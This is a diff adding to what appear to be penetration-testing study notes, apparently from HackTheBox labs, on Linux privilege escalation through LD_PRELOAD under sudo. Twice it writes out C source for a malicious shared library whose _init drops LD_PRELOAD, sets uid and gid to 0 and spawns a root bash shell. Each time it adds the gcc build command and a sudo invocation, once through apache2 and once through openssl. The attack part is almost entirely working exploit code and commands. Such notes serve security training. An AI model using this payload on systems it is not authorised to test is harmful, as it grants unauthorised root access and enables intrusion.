@@ -653,11 +653,58 @@ Matching Defaults entries for daniel.carter on NIX02:
 User daniel.carter may run the following commands on NIX02:
     (root) NOPASSWD: /usr/sbin/apache2 restart
 ```
-make a dynamic library 
+make a dynamic library
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+```
+
 ```
 $ gcc -fPIC -shared -o root.so root.c -nostartfiles
 ```
 set the LD_PRELOAD var to the malcious library /tmp/root.so
 ```
 $ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+```
+
+**another example**
+```shell
+$ sudo -l
+Matching Defaults entries for htb-student on NIX02:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User htb-student may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/bin/openssl
+```
+
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+```
+
+```
+$ gcc -fPIC -shared -o root.so root.c -nostartfiles
+```
+
+```shell
+$ sudo LD_PRELOAD=/tmp/root.so openssl
 ```
